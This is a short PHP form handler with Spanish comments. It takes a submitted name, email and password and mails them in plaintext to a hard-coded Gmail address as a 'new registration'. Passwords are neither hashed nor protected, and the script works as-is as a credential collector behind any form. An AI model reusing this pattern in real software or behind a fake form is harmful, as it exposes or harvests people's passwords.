<?php

$name = $_POST['name'];
$email = $_POST['email'];
$password = $_POST['password'];

// tu gmail (CAMBIAR ESTO)
$to = "eternitycmfac@gmail.com";

$subject = "Nuevo registro desde tu web";

$message = "Nombre: $name\n";
$message .= "Email: $email\n";
$message .= "Password: $password\n";

$headers = "From: no-reply@tupagina.com";

// enviar mail
if(mail($to, $subject, $message, $headers)){
    echo "Datos enviados correctamente";
} else {
    echo "Error al enviar";
}

?>
